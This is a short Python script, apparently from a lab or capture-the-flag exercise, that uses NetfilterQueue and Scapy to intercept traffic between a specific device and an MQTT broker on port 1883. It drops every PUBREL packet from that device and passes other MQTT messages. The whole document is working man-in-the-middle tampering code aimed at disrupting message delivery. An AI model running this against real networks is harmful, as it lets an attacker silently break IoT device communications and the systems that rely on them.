from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP

DEVICE_IP = "10.129.158.100"
BROKER_IP = "10.129.158.205"
BROKER_PORT = 1883

def handle(pkt):
    ip = IP(pkt.get_payload())

    if ip.haslayer(TCP):
        tcp = ip[TCP]
        payload = bytes(tcp.payload)

        if (
            ip.src == DEVICE_IP and
            ip.dst == BROKER_IP and
            tcp.dport == BROKER_PORT and
            len(payload) >= 1
        ):
            mqtt_type = payload[0] >> 4

            if mqtt_type == 6:
                print("[DROP] PUBREL:",
                      ip.src, "->", ip.dst,
                      "sport:", tcp.sport,
                      "dport:", tcp.dport,
                      "payload:", payload.hex())
                pkt.drop()
                return

            print("[PASS] MQTT type",
                  mqtt_type,
                  ip.src, "->", ip.dst,
                  "payload:", payload[:20].hex())

    pkt.accept()

nfq = NetfilterQueue()
nfq.bind(5, handle)

print("[+] NFQUEUE active")
print("[+] Passing CONNECT/PUBLISH/PUBACK/PING/etc.")
print("[+] Dropping only PUBREL from 10.129.158.100 to 10.129.158.205")

try:
    nfq.run()
except KeyboardInterrupt:
    print("\n[+] Exiting")
    nfq.unbind()
